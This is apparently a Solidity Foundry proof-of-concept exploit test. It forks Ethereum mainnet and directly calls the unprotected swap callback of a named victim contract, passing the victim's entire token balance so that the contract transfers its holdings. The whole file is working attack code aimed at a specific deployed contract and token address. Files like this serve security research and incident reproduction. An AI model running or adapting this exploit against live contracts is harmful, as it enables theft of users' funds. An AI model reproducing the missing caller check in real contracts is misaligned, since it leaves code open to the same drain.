// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC20.sol";

interface IVictime{
    function pancakeV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes memory data) external;

}

contract callbackTest is Test {
    address victime_ = address(0x63756A3C3BF677BAAB9D9e06457402ED05BE8570);
    IERC20 max = IERC20(payable(address(0xe7976c4Efc60d9f4C200Cc1bCEF1A1e3B02c73e7)));

    function setUp() public {
      vm.createSelectFork("https://rpc.ankr.com/eth", 20771178);
    }

    function testExploit() public {
        bytes memory data = abi.encode(
            bool(true),
            address(max)
        );
        uint256 amount = IERC20(max).balanceOf(victime_);
        int256 intAmount = int256(amount);


        bytes memory rawCalldata = abi.encodeWithSignature(
            "uniswapV3SwapCallback(int256,int256,bytes)",
            intAmount,
            intAmount,
            data
        );


        (bool success,) = victime_.call(rawCalldata);
        require(success, "Callback function failed");

        emit log_named_bytes("Raw calldata: ", rawCalldata);

    }
    receive() external payable {}
}